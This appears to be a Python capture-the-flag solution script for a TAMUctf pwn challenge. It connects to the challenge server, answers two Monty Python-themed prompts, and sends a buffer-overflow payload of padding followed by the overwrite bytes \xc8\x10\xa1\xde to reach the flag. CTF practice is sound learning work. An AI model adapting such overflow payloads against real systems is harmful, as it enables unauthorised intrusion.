#!/usr/bin/python

import sys, socket, time

def read_sock(sock):
    print("reading ")
    while True:
       
    	sock.send("Sir Lancelot of Camelot\n")
	buff=sock.recv(2048)
	print(buff)
	if "?" in buff:
	    sock.send("To seek the Holy Grail.\n")
	buff2=sock.recv(2048)
	print(buff2)
	if "?" in buff2:
	    secret="A"*7+"B"*8+"C"*8+"D"*8+"E"*8+"FFFF"+ "\xc8\x10\xa1\xde" + "\n"
	    sock.send(secret)
	while(1):
	    buff3=sock.recv(2048)
	    if len(buff3) > 0:
		print(buff3)
	    else:
		time.sleep(1)
		print("That's all, folks!")
	sys.exit(0)
	

def main():
    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    addr=socket.gethostbyname("pwn.tamuctf.com")
    port=4321

    conn=addr,port

    try:
        s.connect(conn)
    except:
        print("Error in connecting to server")
        sys.exit()

    print(s.recv(2048))
    read_sock(s)

if __name__ == '__main__':
    main()
